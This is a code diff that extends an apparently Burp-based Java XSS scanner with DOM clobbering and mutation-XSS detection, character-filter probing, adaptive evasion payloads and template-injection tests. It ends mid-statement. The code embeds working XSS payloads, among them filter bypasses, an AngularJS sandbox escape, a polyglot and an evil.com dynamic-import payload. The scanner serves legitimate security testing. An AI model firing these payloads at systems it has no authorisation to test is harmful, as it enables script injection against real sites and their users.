@@ -138,6 +138,25 @@ public class XssScanner implements ScanModule {
         DOM_SINKS_ALL = all.toArray(new String[0]);
     }
 
+    // DOM Clobbering patterns — vulnerable named DOM access (Improvement 4)
+    private static final String[] DOM_CLOBBERING_ACCESS = {
+            "document.getElementById(", "document.getElementsByName(",
+            "document.forms.", "document.anchors.",
+    };
+
+    // DOM Clobbering sinks — where clobbered values become dangerous
+    private static final String[] DOM_CLOBBERING_SINKS = {
+            ".href", ".src", ".action", ".value", ".textContent", ".innerHTML",
+    };
+
+    // Mutation XSS patterns — innerHTML round-trip indicators (Improvement 5)
+    private static final Pattern MXSS_INNERHTML_ROUNDTRIP = Pattern.compile(
+            "(\\w+)\\.innerHTML\\s*=\\s*(\\w+)\\.innerHTML",
+            Pattern.CASE_INSENSITIVE);
+    private static final Pattern MXSS_JQUERY_ROUNDTRIP = Pattern.compile(
+            "\\$\\(\\s*(\\w+)\\s*\\)\\.html\\(\\s*\\$\\(\\s*(\\w+)\\s*\\)\\.html\\(\\)",
+            Pattern.CASE_INSENSITIVE);
+
     // Known sanitizers — if present near a sink, reduces confidence
     private static final String[] SANITIZERS = {
             "DOMPurify.sanitize(", "DOMPurify.sanitize (",
@@ -185,6 +204,19 @@ public class XssScanner implements ScanModule {
 
     // Canary for reflection detection
     private static final String CANARY = "xSsX7c4n4ry";
+
+    // Character probe string for smart filter detection (Improvement 1)
+    private static final String CHAR_PROBE = "<>\"'/(;)={}[]|!`^$";
+
+    // Common route path words to skip when extracting path segment targets (Improvement 3)
+    private static final Set<String> COMMON_ROUTE_WORDS = Set.of(
+            "api", "v1", "v2", "v3", "search", "users", "admin", "static", "assets",
+            "css", "js", "img", "public", "login", "logout", "register", "profile",
+            "settings", "dashboard", "results", "page", "index", "home", "about",
+            "contact", "auth", "oauth", "callback", "webhook", "health", "status",
+            "docs", "help", "faq", "terms", "privacy", "legal", "blog", "news",
+            "feed", "rss", "sitemap", "robots", "favicon", "manifest", "sw"
+    );
 
     // Context-specific payloads
     private static final Map<String, String[][]> CONTEXT_PAYLOADS = new LinkedHashMap<>();
@@ -385,6 +417,14 @@ public class XssScanner implements ScanModule {
         analyzeHtmlEventHandlers(body, url, requestResponse, findings, reported);
         analyzeJavaScriptUrls(body, url, requestResponse, findings, reported);
         analyzeFrameworkAttributes(body, url, requestResponse, findings, reported);
+
+        // 10. DOM Clobbering detection (Improvement 4)
+        analyzeDomClobbering(body, url, requestResponse, findings, reported);
+
+        // 11. Mutation XSS pattern detection (Improvement 5)
+        for (String script : scriptBlocks) {
+            analyzeMutationXssPatterns(script, url, requestResponse, findings, reported);
+        }
 
         return findings;
     }
@@ -1065,6 +1105,297 @@ public class XssScanner implements ScanModule {
         }
     }
 
+    // ==================== PASSIVE: DOM CLOBBERING (Improvement 4) ====================
+
+    /**
+     * Phase 10: DOM Clobbering detection.
+     * Detects patterns where named DOM element access (getElementById, forms, window.)
+     * could be clobbered by attacker-injected HTML elements.
+     */
+    private void analyzeDomClobbering(String body, String url, HttpRequestResponse reqResp,
+                                       List<Finding> findings, Set<String> reported) {
+        List<String> scriptBlocks = extractScriptBlocks(body, "text/html");
+
+        for (String script : scriptBlocks) {
+            // Pattern 1: getElementById → property access that flows to sink
+            Pattern getByIdPattern = Pattern.compile(
+                    "document\\.getElementById\\s*\\(\\s*[\"']([^\"']+)[\"']\\s*\\)\\s*(?:\\.|;)");
+            Matcher gbiMatcher = getByIdPattern.matcher(script);
+            while (gbiMatcher.find()) {
+                String elementId = gbiMatcher.group(1);
+                int matchEnd = gbiMatcher.end();
+                String afterMatch = script.substring(matchEnd - 1,
+                        Math.min(script.length(), matchEnd + 200));
+
+                // Check if the element's property flows to a dangerous operation
+                for (String sink : DOM_CLOBBERING_SINKS) {
+                    if (afterMatch.contains(sink)) {
+                        String key = "dom-clobber|getElementById|" + elementId + "|" + sink;
+                        if (reported.contains(key)) continue;
+
+                        // Check if the element ID appears in HTML (could be clobbered)
+                        boolean idInHtml = body.contains("id=\"" + elementId + "\"")
+                                || body.contains("id='" + elementId + "'");
+
+                        String context = extractContext(script, gbiMatcher.start(),
+                                Math.min(script.length(), matchEnd + 150));
+
+                        findings.add(Finding.builder("xss-scanner",
+                                        "DOM Clobbering: getElementById('" + elementId + "') → " + sink,
+                                        Severity.MEDIUM, Confidence.TENTATIVE)
+                                .url(url)
+                                .evidence("Element ID: " + elementId
+                                        + " | Property access: " + sink
+                                        + " | ID found in HTML: " + idInHtml
+                                        + "\nContext:\n" + context)
+                                .description("The code accesses document.getElementById('" + elementId
+                                        + "') and uses its '" + sink + "' property. If an attacker can inject "
+                                        + "HTML with id=\"" + elementId + "\", they can control the element's "
+                                        + "properties (DOM clobbering). For example, injecting "
+                                        + "<a id=\"" + elementId + "\" href=\"https://evil.com\"> "
+                                        + "would clobber the .href property.")
+                                .remediation("Always null-check getElementById results. Validate property "
+                                        + "values before use. Use Content-Security-Policy to limit impact.")
+                                .requestResponse(reqResp)
+                                .build());
+                        reported.add(key);
+                        break;
+                    }
+                }
+            }
+
+            // Pattern 2: document.forms.X or window.X used without null checks
+            Pattern namedAccessPattern = Pattern.compile(
+                    "(document\\.forms\\.(\\w+)|window\\.(\\w+))\\s*(?:\\.|\\[|;)");
+            Matcher namedMatcher = namedAccessPattern.matcher(script);
+            while (namedMatcher.find()) {
+                String fullAccess = namedMatcher.group(1);
+                String accessedName = namedMatcher.group(2) != null
+                        ? namedMatcher.group(2) : namedMatcher.group(3);
+
+                // Skip common window properties that can't be clobbered
+                if (accessedName != null && Set.of("location", "document", "navigator",
+                        "history", "screen", "console", "alert", "confirm", "prompt",
+                        "setTimeout", "setInterval", "clearTimeout", "clearInterval",
+                        "addEventListener", "removeEventListener", "fetch", "XMLHttpRequest",
+                        "JSON", "Math", "Array", "Object", "String", "Number", "Boolean",
+                        "Date", "RegExp", "Error", "Promise", "Map", "Set", "undefined",
+                        "NaN", "Infinity", "length", "self", "top", "parent", "frames",
+                        "opener", "closed", "innerWidth", "innerHeight", "outerWidth",
+                        "outerHeight", "pageXOffset", "pageYOffset").contains(accessedName)) {
+                    continue;
+                }
+
+                String key = "dom-clobber|named|" + fullAccess;
+                if (reported.contains(key)) continue;
+
+                // Check if there's a null/typeof check before usage
+                String beforeAccess = script.substring(
+                        Math.max(0, namedMatcher.start() - 150), namedMatcher.start());
+                boolean hasGuard = beforeAccess.contains("typeof " + accessedName)
+                        || beforeAccess.contains("if (" + accessedName + ")")
+                        || beforeAccess.contains("if(" + accessedName + ")")
+                        || beforeAccess.contains(accessedName + " &&")
+                        || beforeAccess.contains(accessedName + " !==")
+                        || beforeAccess.contains(accessedName + " !=");
+
+                if (!hasGuard) {
+                    // Check if the accessed value flows to a sink
+                    String afterAccess = script.substring(namedMatcher.end(),
+                            Math.min(script.length(), namedMatcher.end() + 300));
+                    boolean flowsToSink = false;
+                    for (String sink : DOM_SINKS_ALL) {
+                        if (afterAccess.contains(sink)) {
+                            flowsToSink = true;
+                            break;
+                        }
+                    }
+
+                    if (flowsToSink) {
+                        String context = extractContext(script, namedMatcher.start(), namedMatcher.end());
+
+                        findings.add(Finding.builder("xss-scanner",
+                                        "DOM Clobbering: " + fullAccess + " without null check",
+                                        Severity.MEDIUM, Confidence.TENTATIVE)
+                                .url(url)
+                                .evidence("Access pattern: " + fullAccess
+                                        + " | Null check: NO"
+                                        + " | Flows to sink: YES"
+                                        + "\nContext:\n" + context)
+                                .description("The code accesses '" + fullAccess + "' without a null/typeof "
+                                        + "guard and the value flows to a dangerous sink. An attacker who can "
+                                        + "inject HTML elements with name=\"" + accessedName + "\" or "
+                                        + "id=\"" + accessedName + "\" can shadow this property (DOM clobbering) "
+                                        + "and control the value that reaches the sink.")
+                                .remediation("Add null/typeof checks before accessing named properties. "
+                                        + "Use explicit APIs (e.g., getElementById) instead of implicit "
+                                        + "window.X or document.forms.X access.")
+                                .requestResponse(reqResp)
+                                .build());
+                        reported.add(key);
+                    }
+                }
+            }
+        }
+    }
+
+    // ==================== PASSIVE: MUTATION XSS PATTERNS (Improvement 5) ====================
+
+    /**
+     * Phase 11: Mutation XSS (mXSS) pattern detection.
+     * Detects innerHTML round-trip patterns that cause browser parsing differentials.
+     */
+    private void analyzeMutationXssPatterns(String script, String url, HttpRequestResponse reqResp,
+                                             List<Finding> findings, Set<String> reported) {
+        // Pattern 1: innerHTML read-then-write (el1.innerHTML = el2.innerHTML)
+        Matcher roundtripMatcher = MXSS_INNERHTML_ROUNDTRIP.matcher(script);
+        while (roundtripMatcher.find()) {
+            String key = "mxss|innerHTML-roundtrip|" + roundtripMatcher.start();
+            if (reported.contains(key)) continue;
+
+            String context = extractContext(script, roundtripMatcher.start(), roundtripMatcher.end());
+
+            findings.add(Finding.builder("xss-scanner",
+                            "Mutation XSS: innerHTML Read-Then-Write",
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("Pattern: " + roundtripMatcher.group() + "\nContext:\n" + context)
+                    .description("innerHTML is read from one element and written to another. "
+                            + "Browsers may mutate HTML during the innerHTML getter serialization, "
+                            + "creating new attack vectors. For example, `<listing>&lt;img onerror=alert(1)//` "
+                            + "can mutate into a valid img tag during innerHTML round-trip.")
+                    .remediation("Avoid reading innerHTML and writing it to another element. "
+                            + "Use cloneNode(true) for safe DOM copying, or sanitize with DOMPurify "
+                            + "after reading innerHTML.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // Pattern 2: Generic innerHTML read followed by write on different variable
+        Pattern innerHtmlReadWrite = Pattern.compile(
+                "(\\w+)\\s*=\\s*(\\w+)\\.innerHTML[\\s\\S]{0,500}?(\\w+)\\.innerHTML\\s*=\\s*\\1");
+        Matcher rwMatcher = innerHtmlReadWrite.matcher(script);
+        while (rwMatcher.find()) {
+            String key = "mxss|innerHTML-var-roundtrip|" + rwMatcher.start();
+            if (reported.contains(key)) continue;
+
+            String context = extractContext(script, rwMatcher.start(), rwMatcher.end());
+
+            findings.add(Finding.builder("xss-scanner",
+                            "Mutation XSS: innerHTML Value Stored and Re-Injected",
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("Variable '" + rwMatcher.group(1) + "' stores innerHTML from '"
+                            + rwMatcher.group(2) + "' and is written to '"
+                            + rwMatcher.group(3) + "'.innerHTML"
+                            + "\nContext:\n" + context)
+                    .description("A variable stores the innerHTML of one element and later assigns it "
+                            + "to another element's innerHTML. The browser's HTML serializer may mutate "
+                            + "the content during the read (getter) phase, creating parsing differentials "
+                            + "that can lead to mXSS.")
+                    .remediation("Use textContent for safe text transfer. If HTML transfer is needed, "
+                            + "sanitize with DOMPurify.sanitize() between read and write.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // Pattern 3: DOMParser then innerHTML injection
+        if (script.contains("DOMParser") && script.contains(".innerHTML")) {
+            Pattern domParserPattern = Pattern.compile(
+                    "new\\s+DOMParser\\s*\\(\\s*\\)\\.parseFromString\\s*\\([^)]+\\)");
+            Matcher dpMatcher = domParserPattern.matcher(script);
+            while (dpMatcher.find()) {
+                // Check if innerHTML is used within 500 chars after DOMParser
+                int afterIdx = dpMatcher.end();
+                String after = script.substring(afterIdx,
+                        Math.min(script.length(), afterIdx + 500));
+                if (after.contains(".innerHTML")) {
+                    String key = "mxss|domparser-innerHTML|" + dpMatcher.start();
+                    if (reported.contains(key)) continue;
+
+                    String context = extractContext(script, dpMatcher.start(),
+                            afterIdx + after.indexOf(".innerHTML") + 10);
+
+                    findings.add(Finding.builder("xss-scanner",
+                                    "Mutation XSS: DOMParser → innerHTML",
+                                    Severity.MEDIUM, Confidence.TENTATIVE)
+                            .url(url)
+                            .evidence("DOMParser output used with innerHTML"
+                                    + "\nContext:\n" + context)
+                            .description("HTML is parsed with DOMParser and then re-injected via innerHTML. "
+                                    + "DOMParser and innerHTML may serialize HTML differently, creating "
+                                    + "mutation vectors where safe-looking input becomes dangerous after "
+                                    + "the parsing round-trip.")
+                            .remediation("If re-injection is necessary, sanitize the DOMParser output "
+                                    + "with DOMPurify.sanitize() before assigning to innerHTML.")
+                            .requestResponse(reqResp)
+                            .build());
+                    reported.add(key);
+                }
+            }
+        }
+
+        // Pattern 4: DOMPurify with RETURN_DOM followed by innerHTML
+        if (script.contains("DOMPurify") && script.contains("RETURN_DOM")) {
+            Pattern purifyDomPattern = Pattern.compile(
+                    "DOMPurify\\.sanitize\\s*\\([^)]*RETURN_DOM[^)]*\\)");
+            Matcher pdMatcher = purifyDomPattern.matcher(script);
+            while (pdMatcher.find()) {
+                int afterIdx = pdMatcher.end();
+                String after = script.substring(afterIdx,
+                        Math.min(script.length(), afterIdx + 300));
+                if (after.contains(".innerHTML")) {
+                    String key = "mxss|dompurify-returndom|" + pdMatcher.start();
+                    if (reported.contains(key)) continue;
+
+                    String context = extractContext(script, pdMatcher.start(),
+                            afterIdx + after.indexOf(".innerHTML") + 10);
+
+                    findings.add(Finding.builder("xss-scanner",
+                                    "Mutation XSS: DOMPurify RETURN_DOM → innerHTML",
+                                    Severity.MEDIUM, Confidence.TENTATIVE)
+                            .url(url)
+                            .evidence("DOMPurify.sanitize with RETURN_DOM, then .innerHTML access"
+                                    + "\nContext:\n" + context)
+                            .description("DOMPurify.sanitize() with {RETURN_DOM: true} returns a DOM node. "
+                                    + "Calling .innerHTML on this node re-serializes the sanitized DOM, "
+                                    + "which may produce different HTML than what DOMPurify validated, "
+                                    + "potentially creating mutation XSS vectors.")
+                            .remediation("Use DOMPurify.sanitize() with default options (returns string) "
+                                    + "and assign directly to innerHTML. Avoid RETURN_DOM → innerHTML chains.")
+                            .requestResponse(reqResp)
+                            .build());
+                    reported.add(key);
+                }
+            }
+        }
+
+        // Pattern 5: jQuery .html() round-trip
+        Matcher jqRtMatcher = MXSS_JQUERY_ROUNDTRIP.matcher(script);
+        while (jqRtMatcher.find()) {
+            String key = "mxss|jquery-roundtrip|" + jqRtMatcher.start();
+            if (reported.contains(key)) continue;
+
+            String context = extractContext(script, jqRtMatcher.start(), jqRtMatcher.end());
+
+            findings.add(Finding.builder("xss-scanner",
+                            "Mutation XSS: jQuery .html() Round-Trip",
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("Pattern: " + jqRtMatcher.group() + "\nContext:\n" + context)
+                    .description("jQuery's .html() is used to read HTML from one element and write it "
+                            + "to another. jQuery's internal HTML serialization may differ from the "
+                            + "browser's native serialization, creating mutation XSS vectors.")
+                    .remediation("Use .text() for safe text transfer. If HTML transfer is needed, "
+                            + "sanitize with DOMPurify.sanitize() between .html() read and write.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+    }
+
     // ==================== ACTIVE: DOM XSS TESTING ====================
 
     /**
@@ -1221,6 +1552,144 @@ public class XssScanner implements ScanModule {
         return Math.abs(aIdx - bIdx) < 500;
     }
 
+    // ==================== SMART CHARACTER FILTER PROBING (Improvement 1) ====================
+
+    /**
+     * Probes which XSS-relevant characters survive server-side filtering.
+     * Sends CANARY + CHAR_PROBE and checks which characters appear in the response.
+     * Returns a map of character → survived (true/false).
+     */
+    private Map<Character, Boolean> probeCharacterFiltering(HttpRequestResponse original,
+                                                             XssTarget target) throws InterruptedException {
+        Map<Character, Boolean> survival = new LinkedHashMap<>();
+        String probePayload = CANARY + CHAR_PROBE;
+
+        HttpRequestResponse result = sendPayload(original, target, probePayload);
+        if (result == null || result.response() == null) {
+            // If probe fails, assume all chars pass (fall back to original behavior)
+            for (char c : CHAR_PROBE.toCharArray()) survival.put(c, true);
+            return survival;
+        }
+
+        String body = result.response().bodyToString();
+        int canaryIdx = body.indexOf(CANARY);
+        if (canaryIdx < 0) {
+            // Canary not found — shouldn't happen since we checked earlier
+            for (char c : CHAR_PROBE.toCharArray()) survival.put(c, true);
+            return survival;
+        }
+
+        // Check the region after the canary for surviving characters
+        String afterCanary = body.substring(canaryIdx + CANARY.length(),
+                Math.min(body.length(), canaryIdx + CANARY.length() + CHAR_PROBE.length() + 50));
+
+        for (char c : CHAR_PROBE.toCharArray()) {
+            survival.put(c, afterCanary.indexOf(c) >= 0);
+        }
+
+        // Log results
+        StringBuilder pass = new StringBuilder();
+        StringBuilder block = new StringBuilder();
+        for (Map.Entry<Character, Boolean> e : survival.entrySet()) {
+            if (e.getValue()) pass.append(e.getKey());
+            else block.append(e.getKey());
+        }
+        api.logging().logToOutput("[XSS] Filter probe: PASS=[" + pass + "] BLOCK=[" + block
+                + "] for param '" + target.name + "'");
+
+        return survival;
+    }
+
+    /**
+     * Checks if a payload is viable given the character survival map.
+     * Returns false if the payload uses any blocked character.
+     */
+    private boolean payloadViableWithChars(String payload, Map<Character, Boolean> charSurvival) {
+        for (Map.Entry<Character, Boolean> entry : charSurvival.entrySet()) {
+            if (!entry.getValue() && payload.indexOf(entry.getKey()) >= 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    /**
+     * Generates adaptive evasion payloads based on which characters survive filtering.
+     * Returns payloads specifically designed to work with the available character set.
+     */
+    private List<String[]> generateAdaptiveEvasions(Map<Character, Boolean> charSurvival) {
+        List<String[]> evasions = new ArrayList<>();
+        boolean ltPass = charSurvival.getOrDefault('<', false);
+        boolean gtPass = charSurvival.getOrDefault('>', false);
+        boolean dqPass = charSurvival.getOrDefault('"', false);
+        boolean sqPass = charSurvival.getOrDefault('\'', false);
+        boolean parenPass = charSurvival.getOrDefault('(', false);
+        boolean eqPass = charSurvival.getOrDefault('=', false);
+        boolean backPass = charSurvival.getOrDefault('`', false);
+        boolean slashPass = charSurvival.getOrDefault('/', false);
+        boolean bracePass = charSurvival.getOrDefault('{', false);
+
+        // Parentheses blocked → use backtick call syntax
+        if (!parenPass && backPass) {
+            if (ltPass && gtPass) {
+                evasions.add(new String[]{"<img src=x onerror=alert`1`>", "onerror=alert", "Backtick call (parens blocked)"});
+                evasions.add(new String[]{"<svg onload=alert`1`>", "onload=alert", "SVG backtick call"});
+            }
+        }
+
+        // Parentheses blocked → use entity-encoded parentheses in event handler
+        if (!parenPass && ltPass && gtPass && eqPass) {
+            evasions.add(new String[]{"<img src=x onerror=alert&lpar;1&rpar;>", "onerror=alert", "Entity-encoded parens"});
+            evasions.add(new String[]{"<img src=x onerror=alert&#40;1&#41;>", "onerror=alert", "Numeric entity parens"});
+        }
+
+        // Angle brackets blocked → encoded variants (double-decode check)
+        if (!ltPass || !gtPass) {
+            evasions.add(new String[]{"%3Cscript%3Ealert(1)%3C/script%3E", "alert(1)", "URL-encoded angle brackets"});
+            evasions.add(new String[]{"&#60;script&#62;alert(1)&#60;/script&#62;", "alert(1)", "HTML entity angle brackets"});
+            evasions.add(new String[]{"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "alert(1)", "Unicode escape brackets"});
+        }
+
+        // Both quotes blocked → unquoted attribute payloads
+        if (!dqPass && !sqPass && ltPass && gtPass && eqPass) {
+            evasions.add(new String[]{"<img src=x onerror=alert(1)>", "onerror=alert", "Unquoted attribute (quotes blocked)"});
+            evasions.add(new String[]{"<input onfocus=alert(1) autofocus>", "onfocus=alert", "Autofocus unquoted"});
+        }
+
+        // Angle brackets blocked → JS-context-only expression injection
+        if (!ltPass && !gtPass) {
+            if (dqPass) {
+                evasions.add(new String[]{"\"-alert(1)-\"", "alert(1)", "JS expression injection (dquote, no brackets)"});
+                evasions.add(new String[]{"\";alert(1)//", "alert(1)", "JS breakout semicolon (no brackets)"});
+            }
+            if (sqPass) {
+                evasions.add(new String[]{"'-alert(1)-'", "alert(1)", "JS expression injection (squote, no brackets)"});
+                evasions.add(new String[]{"';alert(1)//", "alert(1)", "JS breakout semicolon squote (no brackets)"});
+            }
+            if (backPass && bracePass) {
+                evasions.add(new String[]{"${alert(1)}", "alert(1)", "Template literal injection (no brackets)"});
+            }
+        }
+
+        // Everything blocked except backtick and slash
+        if (!ltPass && !gtPass && !dqPass && !sqPass && !parenPass && backPass) {
+            evasions.add(new String[]{"`${alert`1`}`", "alert", "Backtick-only payload"});
+        }
+
+        // Fallback: if angle brackets pass but quotes/parens are restricted
+        if (ltPass && gtPass && !parenPass && !backPass) {
+            evasions.add(new String[]{"<details open ontoggle=import('//evil.com')>", "ontoggle=", "Dynamic import (no parens/backticks)"});
+        }
+
+        // If most chars pass, add polyglot
+        if (ltPass && gtPass && (dqPass || sqPass)) {
+            evasions.add(new String[]{"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+                    "alert()", "XSS polyglot (adaptive)"});
+        }
+
+        return evasions;
+    }
+
     // ==================== ACTIVE: REFLECTED XSS ====================
 
     private void testReflectedXss(HttpRequestResponse original, XssTarget target) throws InterruptedException {
@@ -1258,16 +1727,51 @@ public class XssScanner implements ScanModule {
                 .requestResponse(canaryResult)
                 .build());
 
-        // Step 3: Send context-specific payloads
+        // Step 3: Smart character filter probing (Improvement 1)
+        Map<Character, Boolean> charSurvival = probeCharacterFiltering(original, target);
+        perHostDelay();
+
+        // Check if ALL XSS-relevant characters are filtered
+        boolean allBlocked = true;
+        for (boolean survived : charSurvival.values()) {
+            if (survived) { allBlocked = false; break; }
+        }
+        if (allBlocked) {
+            findingsStore.addFinding(Finding.builder("xss-scanner",
+                            "XSS: All XSS-relevant characters filtered",
+                            Severity.INFO, Confidence.FIRM)
+                    .url(url).parameter(target.name)
+                    .evidence("All characters in probe '" + CHAR_PROBE + "' were stripped/encoded")
+                    .description("Parameter '" + target.name + "' reflects input but all XSS-relevant "
+                            + "characters are filtered. Standard XSS payloads are unlikely to work.")
+                    .requestResponse(canaryResult)
+                    .build());
+            // Still try encoding-based and header injection tests
+            if (config.getBool("xss.encodingXss.enabled", true)) {
+                testEncodingXss(original, target, url);
+            }
+            if (config.getBool("xss.headerInjection.enabled", true)) {
+                testHeaderReflectionXss(original, target, url);
+            }
+            return;
+        }
+
+        // Step 4: Send context-specific payloads (filtered by char survival)
         String[][] payloads = CONTEXT_PAYLOADS.get(context);
         if (payloads == null) payloads = CONTEXT_PAYLOADS.get("HTML_BODY"); // Default
 
+        boolean contextPayloadWorked = false;
         for (String[] payload : payloads) {
             String xssPayload = payload[0];
             String checkFor = payload[1];
             String desc = payload[2];
 
-    
+            // Skip payloads that use blocked characters (Improvement 1)
+            if (!payloadViableWithChars(xssPayload, charSurvival)) {
+                api.logging().logToOutput("[XSS] Skipping payload '" + desc + "' — uses blocked chars");
+                continue;
+            }
+
             HttpRequestResponse result = sendPayload(original, target, xssPayload);
             if (result == null || result.response() == null) continue;
 
@@ -1288,12 +1792,27 @@ public class XssScanner implements ScanModule {
             perHostDelay();
         }
 
-        // Step 4: Try filter evasion payloads if basic payloads failed
+        // Step 5: Try adaptive evasion payloads based on char survival (Improvement 1)
         if (config.getBool("xss.evasion.enabled", true)) {
-            testFilterEvasion(original, target, url, context);
+            testFilterEvasion(original, target, url, context, charSurvival);
         }
 
-        // Step 5: Blind XSS via Collaborator
+        // Step 6: Client-side template injection (Improvement 2)
+        if (config.getBool("xss.csti.enabled", true)) {
+            testTemplateInjection(original, target, url);
+        }
+
+        // Step 7: Encoding negotiation XSS (Improvement 6)
+        if (config.getBool("xss.encodingXss.enabled", true)) {
+            testEncodingXss(original, target, url);
+        }
+
+        // Step 8: Response header injection XSS (Improvement 7)
+        if (config.getBool("xss.headerInjection.enabled", true)) {
+            testHeaderReflectionXss(original, target, url);
+        }
+
+        // Step 9: Blind XSS via Collaborator
         if (config.getBool("xss.blindOob.enabled", true)
                 && collaboratorManager != null && collaboratorManager.isAvailable()) {
             testBlindXss(original, target, url);
@@ -1301,13 +1820,17 @@ public class XssScanner implements ScanModule {
     }
 
     private void testFilterEvasion(HttpRequestResponse original, XssTarget target,
-                                    String url, String context) throws InterruptedException {
+                                    String url, String context,
+                                    Map<Character, Boolean> charSurvival) throws InterruptedException {
+        // First: try static evasion payloads, skipping those using blocked chars
         for (String[] evasion : EVASION_PAYLOADS) {
             String payload = evasion[0];
             String checkFor = evasion[1];
             String technique = evasion[2];
 
-    
+            // Skip payloads that use blocked characters (Improvement 1)
+            if (!payloadViableWithChars(payload, charSurvival)) continue;
+
             HttpRequestResponse result = sendPayload(original, target, payload);
             if (result == null || result.response() == null) continue;
 
@@ -1320,6 +1843,266 @@ public class XssScanner implements ScanModule {
                         .url(url).parameter(target.name)
                         .evidence("Evasion technique: " + technique + " | Payload: " + payload)
                         .description("XSS filter bypassed using " + technique + ". Context: " + context + ".")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+
+        // Second: try adaptive evasion payloads generated from char survival analysis
+        List<String[]> adaptiveEvasions = generateAdaptiveEvasions(charSurvival);
+        api.logging().logToOutput("[XSS] Generated " + adaptiveEvasions.size()
+                + " adaptive evasion payloads for param '" + target.name + "'");
+
+        for (String[] evasion : adaptiveEvasions) {
+            String payload = evasion[0];
+            String checkFor = evasion[1];
+            String technique = evasion[2];
+
+            HttpRequestResponse result = sendPayload(original, target, payload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            if (!checkFor.isEmpty() && body.contains(checkFor)) {
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "XSS via Adaptive Evasion: " + technique,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(target.name)
+                        .evidence("Adaptive evasion: " + technique + " | Payload: " + payload
+                                + " | Based on char filter analysis")
+                        .description("XSS filter bypassed using adaptive payload '" + technique
+                                + "' generated from character filter analysis. Context: " + context + ".")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== CLIENT-SIDE TEMPLATE INJECTION (Improvement 2) ====================
+
+    /**
+     * Tests for Client-Side Template Injection (CSTI) in AngularJS, Vue, and similar frameworks.
+     * Sends template expressions and checks if they are evaluated (e.g., {{7*7}} → 49).
+     */
+    private void testTemplateInjection(HttpRequestResponse original, XssTarget target,
+                                        String url) throws InterruptedException {
+        String[][] cstiPayloads = {
+                {"{{7*7}}", "49", "{{7*7}}", "AngularJS/Vue template expression"},
+                {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "{{constructor", "AngularJS sandbox escape (< 1.6)"},
+                {"{{$on.constructor('alert(1)')()}}", "alert(1)", "{{$on", "AngularJS sandbox escape (alt)"},
+                {"${7*7}", "49", "${7*7}", "JS template literal / Pebble / Freemarker"},
+                {"<%= 7*7 %>", "49", "<%= 7*7", "EJS/ERB template"},
+                {"#{7*7}", "49", "#{7*7}", "Pug/Jade template"},
+        };
+
+        for (String[] entry : cstiPayloads) {
+            String payload = entry[0];
+            String evalResult = entry[1];
+            String templateSyntax = entry[2];
+            String desc = entry[3];
+
+            HttpRequestResponse result = sendPayload(original, target, payload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            // CSTI is confirmed if the expression was EVALUATED (result present)
+            // but the template syntax itself is NOT present (it was processed)
+            boolean resultPresent = body.contains(evalResult);
+            boolean syntaxPresent = body.contains(templateSyntax);
+
+            if (resultPresent && !syntaxPresent) {
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "Client-Side Template Injection (CSTI): " + desc,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(target.name)
+                        .evidence("Payload: " + payload + " | Evaluated to: " + evalResult
+                                + " | Template syntax '" + templateSyntax + "' was processed (not reflected raw)")
+                        .description("Client-side template injection detected via " + desc + ". "
+                                + "The template expression '" + payload + "' was evaluated by the client-side "
+                                + "template engine, producing '" + evalResult + "'. An attacker can inject "
+                                + "arbitrary template expressions to achieve XSS.")
+                        .remediation("Avoid injecting user input into template expressions. Use safe bindings "
+                                + "(e.g., ng-bind in AngularJS, {{ }} with v-text in Vue). Upgrade AngularJS "
+                                + "to Angular (2+) which has stricter sandbox.")
+                        .requestResponse(result)
+                        .build());
+                return; // CSTI confirmed
+            }
+
+            // Also check for partial evaluation (template syntax gone but result not exactly matching)
+            if (!syntaxPresent && body.contains(CANARY)) {
+                // Template syntax was consumed — possible CSTI even if eval result differs
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "Possible CSTI: Template Syntax Consumed — " + desc,
+                                Severity.MEDIUM, Confidence.TENTATIVE)
+                        .url(url).parameter(target.name)
+                        .evidence("Payload: " + payload + " | Template syntax '" + templateSyntax
+                                + "' was consumed (not reflected)")
+                        .description("The template expression '" + payload + "' was consumed by what appears "
+                                + "to be a client-side template engine (" + desc + "). The exact evaluation "
+                                + "result was not detected, but the syntax was processed, suggesting CSTI potential.")
+                        .requestResponse(result)
+                        .build());
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== ENCODING NEGOTIATION XSS (Improvement 6) ====================
+
+    /**
+     * Tests for charset-based XSS vectors. Only runs if the response Content-Type
+     * is missing charset specification or uses a non-UTF-8 encoding.
+     */
+    private void testEncodingXss(HttpRequestResponse original, XssTarget target,
+                                  String url) throws InterruptedException {
+        // First check if encoding-based tests are applicable
+        HttpRequestResponse baseline = sendPayload(original, target, CANARY);
+        if (baseline == null || baseline.response() == null) return;
+
+        String contentType = "";
+        for (var h : baseline.response().headers()) {
+            if (h.name().equalsIgnoreCase("Content-Type")) {
+                contentType = h.value().toLowerCase();
+                break;
+            }
+        }
+
+        // Only test if charset is missing or non-UTF-8
+        boolean missingCharset = !contentType.contains("charset");
+        boolean nonUtf8 = contentType.contains("charset") && !contentType.contains("utf-8");
+        if (!missingCharset && !nonUtf8) {
+            api.logging().logToOutput("[XSS] Encoding XSS skipped — UTF-8 charset specified for param '"
+                    + target.name + "'");
+            return;
+        }
+
+        api.logging().logToOutput("[XSS] Testing encoding-based XSS for param '" + target.name
